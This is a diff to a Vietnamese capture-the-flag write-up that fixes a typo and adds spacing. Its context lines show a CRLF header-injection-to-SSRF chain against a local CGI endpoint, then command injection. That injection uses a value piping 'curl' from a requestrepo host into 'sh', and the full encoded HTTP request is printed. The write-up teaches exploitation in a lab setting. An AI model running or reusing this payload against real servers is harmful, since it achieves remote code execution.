@@ -79,7 +79,7 @@ AddType application/x-httpd-php .php
 Ta thấy  `Attack an IP` chỉ chấp nhận được gọi khi dùng IP local -> cần tìm cách để SSRF tới `Attack an IP`,và chắc chắn là từ `Attack a Domain`.
 
 ### Handler Confusion -> SSRF
-Quay lại phân tích `attack-doamin` ta phát hiện `attack-domain.py` trong `cgi-bin` đã in ra `name` trong thông báo lỗi mà không hề lọc ký tự đặc biệt:
+Quay lại phân tích `attack-domain` ta phát hiện `attack-domain.py` trong `cgi-bin` đã in ra `name` trong thông báo lỗi mà không hề lọc ký tự đặc biệt:
 ```python
 elif is_domain(target):
     count = 1 # Increase this for an actual attack
@@ -115,6 +115,7 @@ target=fe80::1%;curl 1e5qhv69.requestrepo.com | sh&name=hi
 
 
 Gửi request:
+
 ![](https://)![](http://note.bksec.vn/pad/uploads/42308799-a797-4e00-bf6f-e2e52d5a0add.png)
 ```
 GET /cgi-bin/attack-domain?target=1.1.1.1&name=ttp://%0d%0aLocation:/ooo%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3Ftarget%3dfe80%253a%253a1%2525%253bcurl%25201e5qhv69.requestrepo.com%2520|%2520sh%26name%3dhi%20%0d%0a%0d%0a HTTP/1.1
@@ -122,6 +123,7 @@ Host: 127.0.0.1:1337
 Connection: keep-alive
 ```
 Lấy flag:
+
 ![](https://)![](http://note.bksec.vn/pad/uploads/5a80d9e5-87fc-45bb-9c60-225573ce158d.png)
 
 
